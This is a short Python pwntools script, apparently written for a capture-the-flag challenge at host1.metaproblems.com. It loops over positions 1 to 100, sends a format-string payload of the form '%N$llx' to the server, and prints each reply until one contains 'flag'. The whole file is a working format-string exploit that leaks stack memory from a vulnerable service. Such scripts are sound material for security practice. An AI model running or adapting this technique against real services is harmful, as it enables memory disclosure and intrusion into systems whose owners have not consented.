from pwn import *
import sys

host = "host1.metaproblems.com"
port = 5470


num = 1
while True:
	try:
		if num > 100:
			sys.exit()
		s = remote(host, port)

		payload = "%" + str(num) + "$llx"

		print(s.recvline().decode())
		print(payload)
		s.sendline(payload)
		result = s.recvline().decode()
		print(result)

		num += 1

		if "flag" in result:
			sys.exit()

		s.close()	
	except KeyboardInterrupt:
		print("Stopping the process")
		sys.exit()
